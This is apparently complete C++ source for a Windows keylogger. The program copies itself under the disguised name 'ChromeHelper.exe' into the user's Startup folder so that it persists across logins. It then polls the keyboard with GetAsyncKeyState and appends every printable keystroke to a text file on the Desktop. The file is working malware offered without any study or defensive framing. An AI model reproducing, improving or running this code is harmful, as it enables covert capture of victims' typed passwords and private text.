#include <iostream>  
#include <windows.h>
#include <conio.h>   
#include <fstream>   
#include <Lmcons.h>

constexpr unsigned int IS_PRESSED = 0x8001;
constexpr unsigned int NUM_KEYS = 256;
std::string getUsername()
{
    TCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName((TCHAR *)username, &username_len);
    return std::string((char *)username);
}

void copySelfToStartup(std::string username)
{ 
    std::ifstream from("ChromeHelper.exe", std::ios::binary);
    auto buf { from.rdbuf() };
    std::ofstream out("C:\\Users\\" +username+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ChromeHelper.exe", std::ios::binary);
    out << buf;
    out.close();
    from.close();
}
void detectKeyHits(std::fstream &afile, const std::string& username)
{
    char key_press;
    bool keyStates[NUM_KEYS] = {false};
    int ascii_value;
    while (true)
    {
        for (int i = 0; i < NUM_KEYS; ++i)
        {
            if (GetAsyncKeyState(i) & IS_PRESSED)
            {
                if (i < 32 || i > 126)
                    continue;
                if (!keyStates[i])
                {
                    afile.open("C:\\Users\\" + username + "\\Desktop\\notakeylogger.txt", std::fstream::app);

                    afile << static_cast<char>(i);
                    keyStates[i] = true;
                    afile.close();
                }
            }
            else
            {
                keyStates[i] = false;
            }
        }
    }
}
int main()
{
    std::fstream afile;
    std::string username = getUsername();
    copySelfToStartup(username);
    detectKeyHits(afile, username);
    
    afile.close();
}